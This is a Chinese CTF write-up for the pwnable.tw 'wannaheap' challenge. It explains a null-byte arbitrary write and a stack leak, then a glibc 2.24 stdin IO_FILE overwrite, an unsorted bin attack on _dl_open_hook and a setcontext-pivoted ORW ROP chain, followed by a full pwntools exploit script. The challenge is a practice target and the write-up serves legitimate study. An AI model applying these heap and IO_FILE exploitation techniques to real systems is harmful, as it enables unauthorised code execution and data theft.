# Pwnable Wannaheap


> 城市是一片森林，男人是猎手，女人是陷阱。

## 程序分析

**逻辑分析**

64位的菜单程序，保护全开。开始读取一个随机值，来分配mmap的地址。随后分配一个由用户定义的不大于0x313370大小的堆块，并利用沙盒，限制系统调用，使其仅能使用ORW。

程序的主逻辑是创建一个双向链表，并且在双向链表前后，填充随机大小的padding，使得每个链表之间的距离是不固定的。其中表头指向的节点是由一个随机值来决定，这个随机值会破坏链表由输入的index的大小链接起来的顺序，从而在后续显示中，不一定能显示到目标节点，是一个小bug。

![image-20210814165422087](https://gitee.com/nopnoping/img/raw/master/img/image-20210814165422087.png)

![image-20210814165456059](https://gitee.com/nopnoping/img/raw/master/img/image-20210814165456059.png)

**漏洞分析**

在最初由用户定义的不大于0x313370大小的堆块时，如果用户第一次输入的大小大于0x313370将会要求用户重新输入，但是最后分配得到堆块后，会用第一次输入的值来修改堆块的结尾。因此这里存在一个任意地址写\x00漏洞。

![image-20210814165817910](https://gitee.com/nopnoping/img/raw/master/img/image-20210814165817910.png)

在创建堆块数据时，数据内容是用strdup来复制，而复制的内容是储存在栈上，由此存在泄露后续栈地址内容的漏洞。故可利用其来泄露初libc地址。

![image-20210814170204850](https://gitee.com/nopnoping/img/raw/master/img/image-20210814170204850.png)

## 利用思路

> 漏洞1：任意地址写\x00
>
> 漏洞2：泄露栈数据

任意地址写\x00看起来是微不足道，难以利用，就像一滴水滴在树叶上，仅使其微小的颤抖了一些，想要将树叶滴穿，是痴人说梦，但如果这片树叶本身就刚好有一个细小的孔洞，恰能够容下一滴水滴，那么滴穿树叶也就成了可能。

而本题程序所用的libc-2.24版本恰巧就是一片有细小孔洞的树叶，这个孔洞出现在FILE_stdin的IO_buf_end处。

观察FILE_stdin结构，可以发现，IO_buf_end的地址的最低为恰巧为\x00，如果利用漏洞1修改IO_buf_base的最低为，那么我们的输入缓存就可以修改FILE_stdin即随后的值。

![image-20210814171702869](https://gitee.com/nopnoping/img/raw/master/img/image-20210814171702869.png)

当我们分配一个很大的chunk时，将会调用mmap来分配，而分配的值会紧随libc加入内存的地址向下延伸，因此分配得到的地址和libc之间的便宜是固定的，利用这个原理，可以实现对IO_buf_base的修改。

> 注：这里必需分配的还要大于ld间的间隙，否则不会分配到libc上，而回分配到ld中。

![image-20210814172427608](https://gitee.com/nopnoping/img/raw/master/img/image-20210814172427608.png)

![image-20210814172448820](https://gitee.com/nopnoping/img/raw/master/img/image-20210814172448820.png)

利用漏洞2泄露libc后，如何执行ROP链？

这里利用了dl_open_hook，当IO_FILE结构调用相应的vtable函数时，会对其进行检测，在检测函数中会判断dl_open_hook是否为空，不为空时会执行(*dlopen_mode)()，dlopen_mode是dl_open_hook结构的第一个字段，dlopen_mode是指向函数指针的指针。

利用unsorted_bin攻击dl_open_hook后，将会执行main_arena+88指向的gadget，利用该gadget和setcontext最终可以实现栈迁移和执行ROP链。

```c
void attribute_hidden
_IO_vtable_check (void)
{
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (_dl_open_hook != NULL
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }
}
```

## 代码实现

**修改IO_buf_base**

利用漏洞1，将IO_buf_base最低地址修改为\x00。这里输入的字符，用于后续ORW中打开的文件名。

```python
#1.modify stdin buffer
ru("Size :")
sl(str(0x6998e8)) #local
#sl(str(0x6c28e8))
ru("Size :")
sl(str(0x300000))
ru("Content :")
sl("./flag\x00")
```

**泄露libc**

利用漏洞2，来泄露libc，具体的代码实现前，先让我们深入了解一下IO_getc和scanf两个函数，在缓存机制上取值的行为。

### IO_getc

IO_getc首先会锁住IO_FILE结构，然后调用 _IO_getc_unlocked (fp)。

```c
int
_IO_getc (FILE *fp)
{
  int result;
  CHECK_FILE (fp, EOF);
  _IO_acquire_lock (fp);
  result = _IO_getc_unlocked (fp);
  _IO_release_lock (fp);
  return result;
}
```

 _IO_getc_unlocked (fp)是一个宏定义，其根据IO_read_ptr和IO_read_end之间的不同大小，执行不同的操作。

+ \_IO\_read\_ptr>=\_IO\_read\_end	执行\_\_uflow (\_fp)
+ \_IO\_read\_ptr<\_IO\_read\_end 	返回\_IO\_read\_ptr指向的值，并指向下一个地址

```c
#define _IO_getc_unlocked(_fp) \
       (_IO_BE ((_fp)->_IO_read_ptr >= (_fp)->_IO_read_end, 0) \
	? __uflow (_fp) : *(unsigned char *) (_fp)->_IO_read_ptr++)
```

uflow 调用underflow，underflow会调用file_read，最终调用read(,IO_buf_base,IO_buf_end-IO_buf_base)，这里在源码中没有找到，给出汇编代码和调用栈。

> 注：程序沙盒对read的第三个参数count有大小限制，IO_buf_end-IO_buf_base的大小需要在改限制内。

![image-20210814175847326](https://gitee.com/nopnoping/img/raw/master/img/image-20210814175847326.png)

![image-20210814175941285](https://gitee.com/nopnoping/img/raw/master/img/image-20210814175941285.png)

![image-20210814175956687](https://gitee.com/nopnoping/img/raw/master/img/image-20210814175956687.png)

### scanf

scanf函数过于复杂，这里只简单讲解其从缓冲区获取数据的机制，原理和IO_getc一样，会去判断IO_read_ptr和IO_read_end之间的大小关系，但是由于格式字符串的原因，可能不能在我们的缓冲区中匹配到相应字符，因此不会对IO_read_ptr的值进行改变。

利用漏洞2泄露libc是很简单的事情，但是由于沙盒对read第三个参数的限制，不能将IO_buf_end的值修改的过大。

```python
#2.leak libc
ru(">")
s("A")
ru("key :")
s(b"\x22")
ru("data :")
s("a"*8)
ru(">")
ru(">")
s("A")
ru("key :")
s(b"\x12")
ru("data :")
s("a"*0x10)
ru(">")
ru(">")
s("R")
ru("key:")
s(b"\x12")
ru("a"*0x10)
```

**攻击dl_open_hook，调用ROP链**

泄露libc后，我们可以将IO_buf_end修改到main_arena后面，从而可以更改unsorted bin链表实时unsorted bin attack。注意，对于中间的值，最好不要修改，保留原来的值。

观察调用(*dlopen_mode)()后的寄存器环境，发现RAX保留了main_arena的地址，因此考虑libc中是否存在mov rdi,rax;call [rax+xx]这样的gadget，利用call从而来调用setcontext，继而实现栈迁移。

![image-20210814181202915](https://gitee.com/nopnoping/img/raw/master/img/image-20210814181202915.png)

利用ROPgadget查找后，选择了call [rax+0x20]的gadget，在rax+0x20处布置setcontext，随后实现栈迁移。

![image-20210814181407279](https://gitee.com/nopnoping/img/raw/master/img/image-20210814181407279.png)

在IO_stdin结构的后面存在宽字符的缓冲区，可以利用该缓冲区来布置ROP链。

```python
# 3.unsortd bin attack dl_open_hook
# 	local
gadget=libc_base+0x00000000000676aa
heap=libc_base-0x301000
ret=libc_base+0x000000000001fc1c
rdi_ret=libc_base+0x000000000001fc6a
rsi_ret=libc_base+0x000000000001fc1b
rdx_ret=libc_base+0x0000000000001b92
_open=libc_base+libc.symbols["open"]
_read=libc_base+libc.symbols["read"]
_write=libc_base+libc.symbols["write"]

s(p16(((IO_stdin+0x400)&0xffff)))
sleep(5)
info_addr("gadget",gadget)
#3.1 stdin fifo
fake_stdin=p64(IO_stdin+0x341)+p64(0)*6+b"\xff"*8+p64(0xa000000)+p64(io_stdfile_0_lock)+b'\xff'*8+\
p64(0)*5+b'\xff'*4+b'\x00'*4+p64(0)*2+p64(io_file_jumps)
#3.2 fake chunk & ROP
fake_chunk=p64(0)+p64(0x41)+p64(0)+p64(dl_open_hook-0x10)+\
p64(0x20)+p64(0x20)+p64(0)*2+p64(0x40)+p64(0x621)
ORW=p64(rdi_ret)+p64(heap+0x10)+p64(rsi_ret)+p64(4)+\
p64(rdx_ret)+p64(0)+p64(_open)+\
p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(heap+0x30)+\
p64(rdx_ret)+p64(0x100)+p64(_read)+\
p64(rdi_ret)+p64(2)+p64(rsi_ret)+p64(heap+0x30)+\
p64(rdx_ret)+p64(0x20)+p64(_write)
fake_wide=(fake_chunk+ORW).ljust(0x140,b'\x00') #0x140 bytes
#3.3 hook
four_hook=p64(0)*2+p64(0)+p64(0)  #0x20 bytes
#3.4 main_arena data
main_arena=p64(0x100000000)+p64(0)*10+p64(gadget)+p64(IO_stdin+0xa0)*3+\
p64(setcontext+53)+p64(_main_arena+104)
for i in range(7):
main_arena+=p64(_main_arena+120+i*0x10)*2
main_arena+=p64(IO_stdin+0xf0)+p64(ret)
payload=fake_stdin+fake_wide+four_hook+main_arena
#3.5 unsorted bin attack & call dl_open_mode
s(payload)
```

## Epitome

```python
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote('chall.pwnable.tw',10305)
else:
	sh=process("./wannaheap")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	context.terminal = ['tmux', 'splitw', '-v']
	gdb.attach(sh,command)

def choice(elect):
	ru(':')
	sl(str(elect).encode())

def add(size):
	choice(1)
	ru(':')
	sl(str(size).encode())

def edit(index,content):
	choice(2)
	ru(':')
	sl(str(index).encode())
	ru(':')
	sl(content)

def show(index):
	choice(4)
	ru(':')
	sl(str(index).encode())

def delete(index):
	choice(3)
	ru(':')
	sl(str(index).encode())

def exp():
	libc=ELF("/glibc/2.24/64/lib/libc-2.24.so")
	#libc=ELF("./libc-2.24.so")
	debug("b*0x7ffff7aa36aa\nc")
	#1.modify stdin buffer
	ru("Size :")
	sl(str(0x6998e8)) #local
	#sl(str(0x6c28e8))
	ru("Size :")
	sl(str(0x300000))
	ru("Content :")
	sl("./flag\x00")


	#2.leak libc
	ru(">")
	s("A")
	ru("key :")
	s(b"\x22")
	ru("data :")
	s("a"*8)
	ru(">")
	ru(">")
	s("A")
	ru("key :")
	s(b"\x12")
	ru("data :")
	s("a"*0x10)
	ru(">")
	ru(">")
	s("R")
	ru("key:")
	s(b"\x12")
	ru("a"*0x10)

	libc_base=u64(ru("\n").ljust(8,b"\x00"))-libc.symbols["_IO_file_jumps"]
	#libc_base=u64(ru("\n").ljust(8,b"\x00"))-97-libc.symbols["_IO_2_1_stdout_"]
	IO_stdin=libc_base+libc.symbols["_IO_2_1_stdin_"]+0x40

	io_stdfile_0_lock=libc_base+libc.symbols["_IO_stdfile_0_lock"]
	#io_stdfile_0_lock=libc_base+0x3c3770
	
	io_file_jumps=libc_base+libc.symbols["_IO_file_jumps"]
	dl_open_hook=libc_base+libc.symbols["_dl_open_hook"]
	setcontext=libc_base+libc.symbols["setcontext"]
	_main_arena=IO_stdin+0x200
	info_addr("libc_base",libc_base)

	# 3.unsortd bin attack dl_open_hook
	# 	local
	gadget=libc_base+0x00000000000676aa
	heap=libc_base-0x301000
	ret=libc_base+0x000000000001fc1c
	rdi_ret=libc_base+0x000000000001fc6a
	rsi_ret=libc_base+0x000000000001fc1b
	rdx_ret=libc_base+0x0000000000001b92
	# 	remote
	# gadget=libc_base+0x000000000006ebbb
	# heap=libc_base-0x301000
	# ret=libc_base+0x00000000000937
	# rdi_ret=libc_base+0x000000000001fd7a
	# rsi_ret=libc_base+0x000000000001fcbd
	# rdx_ret=libc_base+0x0000000000001b92
	_open=libc_base+libc.symbols["open"]
	_read=libc_base+libc.symbols["read"]
	_write=libc_base+libc.symbols["write"]

	s(p16(((IO_stdin+0x400)&0xffff)))
	sleep(5)
	info_addr("gadget",gadget)
		#3.1 stdin fifo
	fake_stdin=p64(IO_stdin+0x341)+p64(0)*6+b"\xff"*8+p64(0xa000000)+p64(io_stdfile_0_lock)+b'\xff'*8+\
			 p64(0)*5+b'\xff'*4+b'\x00'*4+p64(0)*2+p64(io_file_jumps)
		#3.2 fake chunk & ROP
	fake_chunk=p64(0)+p64(0x41)+p64(0)+p64(dl_open_hook-0x10)+\
				p64(0x20)+p64(0x20)+p64(0)*2+p64(0x40)+p64(0x621)
	ORW=p64(rdi_ret)+p64(heap+0x10)+p64(rsi_ret)+p64(4)+\
			   p64(rdx_ret)+p64(0)+p64(_open)+\
			   p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(heap+0x30)+\
			   p64(rdx_ret)+p64(0x100)+p64(_read)+\
			   p64(rdi_ret)+p64(2)+p64(rsi_ret)+p64(heap+0x30)+\
			   p64(rdx_ret)+p64(0x20)+p64(_write)
	fake_wide=(fake_chunk+ORW).ljust(0x140,b'\x00') #0x140 bytes
		#3.3 hook
	four_hook=p64(0)*2+p64(0)+p64(0)  #0x20 bytes
		#3.4 main_arena data
	main_arena=p64(0x100000000)+p64(0)*10+p64(gadget)+p64(IO_stdin+0xa0)*3+\
				p64(setcontext+53)+p64(_main_arena+104)
	for i in range(7):
		main_arena+=p64(_main_arena+120+i*0x10)*2
	main_arena+=p64(IO_stdin+0xf0)+p64(ret)
	payload=fake_stdin+fake_wide+four_hook+main_arena
		#3.5 unsorted bin attack & call dl_open_mode
	s(payload)
	#debug()
	itr()

exp()

```

> 打远程时，无法执行ROP链，怀疑是由于标准输出关闭后，没有字符来决定发送时机，导致发送数据丢，造成。说白了就是网络延时太高了，如果师傅们发现是别的问题，恳请告知。

Pass：还有一种方法是修改IO_stdin的vtable为IO_str_jumps，然后利用其的underflow来获得shell，不过不知道是否可以用underflow来执行ROP链，之后可以尝试，欢迎师傅们来交流。

### 参考

[CTF中带来的IO_FILE新思路](https://www.77169.net/html/184969.html)
